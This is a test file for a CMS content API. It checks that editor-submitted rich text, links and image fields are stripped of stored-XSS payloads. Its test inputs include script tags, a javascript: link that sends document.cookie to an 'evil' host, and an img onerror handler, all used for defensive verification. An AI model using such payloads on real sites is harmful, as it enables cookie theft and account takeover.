import { describe, it, expect, beforeAll, afterAll, beforeEach } from "vitest";
import { buildApp } from "../../src/app.js";
import type { FastifyInstance } from "fastify";
import { createTestUser, getAccessToken } from "../helpers/auth.js";

// End-to-end proof that the content WRITE boundary sanitises untrusted values,
// closing editor-shipped stored XSS (H-1/H-2). Exercised as an `editor` — the
// lower-trust role that is the actual threat actor.
let app: FastifyInstance;
let editorToken: string;
let pageId: string;

beforeAll(async () => {
  app = await buildApp({ logger: false });
  await app.ready();
});

afterAll(async () => {
  await app.close();
});

beforeEach(async () => {
  await app.prisma.content.deleteMany();
  await app.prisma.page.deleteMany();
  await app.prisma.locale.deleteMany();
  await app.prisma.site.deleteMany();
  await app.prisma.refreshToken.deleteMany();
  await app.prisma.user.deleteMany();

  const site = await app.prisma.site.create({
    data: { key: "demo", name: "Demo Site", domain: "example.com", stagingDomain: "staging.example.com", defaultLocale: "en" },
  });
  const { user: editor } = await createTestUser(app, { role: "editor" });
  editorToken = getAccessToken(editor);
  const page = await app.prisma.page.create({ data: { siteId: site.id, path: "/test-page", sortOrder: 0 } });
  pageId = page.id;
});

async function createContent(body: Record<string, unknown>) {
  return app.inject({
    method: "POST",
    url: "/api/content",
    headers: { authorization: `Bearer ${editorToken}` },
    payload: body,
  });
}

describe("POST /api/content sanitises on write", () => {
  it("strips <script> from richtext before persisting", async () => {
    const res = await createContent({
      pageId,
      key: "body",
      locale: "en",
      type: "richtext",
      value: "<p>hello</p><script>alert(document.cookie)</script>",
    });
    expect(res.statusCode).toBe(201);
    expect(res.json().value).toBe("<p>hello</p>");

    const stored = await app.prisma.content.findFirst({ where: { pageId, key: "body" } });
    expect(stored?.value).toBe("<p>hello</p>");
    expect(stored?.value).not.toContain("<script");
  });

  it("drops a javascript: link to an empty string", async () => {
    const res = await createContent({
      pageId,
      key: "cta",
      locale: "en",
      type: "link",
      value: "javascript:fetch('//evil/'+document.cookie)",
    });
    expect(res.statusCode).toBe(201);
    expect(res.json().value).toBe("");
  });

  it("keeps a safe https link untouched", async () => {
    const res = await createContent({
      pageId,
      key: "cta2",
      locale: "en",
      type: "link",
      value: "https://example.com/contact",
    });
    expect(res.json().value).toBe("https://example.com/contact");
  });

  it("drops a javascript: image src", async () => {
    const res = await createContent({
      pageId,
      key: "hero",
      locale: "en",
      type: "image",
      value: "javascript:alert(1)",
    });
    expect(res.json().value).toBe("");
  });
});

describe("PUT /api/content/:id sanitises on update (type taken from the stored row)", () => {
  it("strips a script injected into an existing richtext entry", async () => {
    const created = await createContent({ pageId, key: "body", locale: "en", type: "richtext", value: "<p>ok</p>" });
    const id = created.json().id;

    const res = await app.inject({
      method: "PUT",
      url: `/api/content/${id}`,
      headers: { authorization: `Bearer ${editorToken}` },
      payload: { value: '<p>ok</p><img src=x onerror="alert(1)">' },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json().value).not.toContain("onerror");
    expect(res.json().value).not.toContain("<img");
  });
});
